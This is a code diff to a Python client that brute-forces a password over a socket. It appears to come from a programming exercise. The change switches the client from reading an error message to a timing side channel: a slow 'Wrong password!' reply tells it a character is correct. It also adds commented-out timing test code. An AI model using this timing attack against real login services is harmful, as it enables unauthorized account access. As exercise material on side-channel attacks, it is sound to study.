@@ -2,6 +2,7 @@ import sys
 import socket
 import string
 import json
+import time
 
 
 CHARS = string.digits + string.ascii_lowercase + string.ascii_uppercase
@@ -42,15 +43,18 @@ def find_pass():
                 json_data = json.dumps(data, indent=4)
                 data = json_data.encode()
                 client_socket.send(data)
+                start = time.time()
                 response = client_socket.recv(1024)
+                end = time.time()
                 response = response.decode()
                 if "Wrong password!" in response:
-                    continue
+                    if end - start >= 0.09:
+                        password = new_password
+                        break
+                    else:
+                        continue
                 elif "Connection success!" in response:
                     return json_data
-                elif "Exception happened during login" in response:
-                    password = new_password
-                    break
 
 
 result = find_pass()
@@ -58,3 +62,12 @@ client_socket.close()
 
 if result:
     print(result)
+
+
+# start = time.time()
+# for i in range(100):
+#     print("a")
+#
+# end = time.time()
+# diff = end - start
+# print(diff)
